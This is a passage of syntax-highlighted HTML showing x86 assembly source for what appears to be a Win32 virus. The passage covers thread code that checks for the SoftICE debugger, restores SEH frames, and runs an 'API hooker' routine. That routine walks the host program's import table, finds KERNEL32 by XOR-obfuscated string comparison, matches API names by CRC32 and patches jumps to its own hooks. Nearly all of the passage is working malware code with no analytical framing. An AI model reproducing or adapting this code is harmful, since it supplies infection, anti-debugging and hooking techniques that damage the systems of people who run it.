       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">THREAD4SEH</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_thread4_seh</span><span class="sc0">                     </span><span class="sc1">;host</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread4Exception</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;if we had an error we</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;must restore the ESP</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeltaRecover4</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DeltaRecover4</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DeltaRecover4</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">restore_thread4_seh</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;and restore the SEH</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hsemaphore</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ReleaseSemaphore</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ExitThread</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">SoftIce1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\\.\SICE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">SoftIce2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\\.\NTICE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread_4_StartAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;€ This Thread is the API hooker thread</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">Thread_5_StartAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">tdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@Thread5Delta</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@Thread5Delta</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Thread5Delta</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">THREAD5SEH</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Thread5Exception</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Setup a SEH frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">skipper</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">APIHOOK</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">firstgen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;don't hook gen0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourimagebase</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; now put imagebase in ebx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">''</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">''</span><span class="sc0">                       </span><span class="sc1">; check if it is an EXE</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get pointer to PE</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                              </span><span class="sc1">; too far away?</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'˚'</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'˚'</span><span class="sc0">                       </span><span class="sc1">; is it a PE?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc0">             </span><span class="sc1">; skip header</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_DataDirectory.DE_Import.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; and get import RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_DataDirectory.DE_Import.DD_Size</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; and import size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; save RVA</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">locate_module</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ID_Name</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; get the name</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'¯·˝'</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NREK'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'¯·˝'</span><span class="sc0">                  </span><span class="sc1">; and compare to KERN</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_the_import_module</span><span class="sc0">                  </span><span class="sc1">; if it is not that one</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR_SIZE</span><span class="sc0">       </span><span class="sc1">; skip to the next desc.</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; but not beyond the size</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                                   </span><span class="sc1">; of the descriptor</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">locate_module</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">found_the_import_module</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; if we found the kernel</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; import descriptor</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ID_FirstThunk</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; take the pointer to</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; addresses</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ID_Characteristics</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; and the pointer to</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">; no names? ;-(</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; names</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">functions_nr</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">hooked_api_locate_loop</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                    </span><span class="sc1">; save pointer to names</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.TD_AddressOfData</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; go to the actual thunk</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">; and skip the hint</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; save these</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringCRC32</span><span class="sc0">                            </span><span class="sc1">; eax = crc32</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;search them...</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HookedFunctions</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">functions_nr</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">check</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;does it match?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_it</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;get next...</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">not_found</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">found_it</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;get the new address</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tempcounter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                </span><span class="sc1">;and align to imagebase</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">found_one_api</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_found</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">; otherwise restore</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">; restore arrays indexes</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">api_next</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">; and skip to next</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; 0? -&gt; end of import</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">hooked_api_locate_loop</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">found_one_api</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">; restore stack</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tempcounter</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookedFunctions</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">proc_len</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StartOfHooks</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">-</span><span class="sc2">0fh</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
